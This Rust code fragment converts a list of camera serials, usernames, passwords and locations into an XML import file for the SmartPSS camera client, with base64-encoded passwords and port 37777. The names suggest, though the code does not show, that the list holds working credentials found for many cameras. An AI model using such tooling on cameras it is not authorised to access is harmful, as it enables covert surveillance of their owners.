fn generate_smartpss_from_ok(ok_serials: &[String], path: &str) -> Result<(), String> {
    use base64::Engine;
    let mut xml = String::from("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n");
    xml.push_str("<DeviceManager version=\"1.0\">\n");
    for (i, entry) in ok_serials.iter().enumerate() {
        let parts: Vec<&str> = entry.split('_').collect();
        if parts.len() < 4 { continue; }
        let country = parts[0];
        let serial = parts[1];
        let user = parts[2];
        let password = parts[3];
        let city = if parts.len() >= 5 { parts[4] } else { "" };
        let b64 = base64::engine::general_purpose::STANDARD.encode(password.as_bytes());
        let name = if city.is_empty() {
            format!("{:02}_{}", i + 1, serial)
        } else {
            format!("{:02}_{}_{}", i + 1, country, serial)
        };
        xml.push_str(&format!(
            "\n<Device connect=\"19\" domain=\"{}\" name=\"{}\" password=\"{}\" port=\"37777\" protocol=\"1\" username=\"{}\"/>",
            xml_escape_cli(serial),
            xml_escape_cli(&name),
            b64,
            xml_escape_cli(user)
        ));
    }
    xml.push_str("\n\n</DeviceManager>\n");
    std::fs::write(path, xml).map_err(|e| e.to_string())
}

fn xml_escape_cli(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}
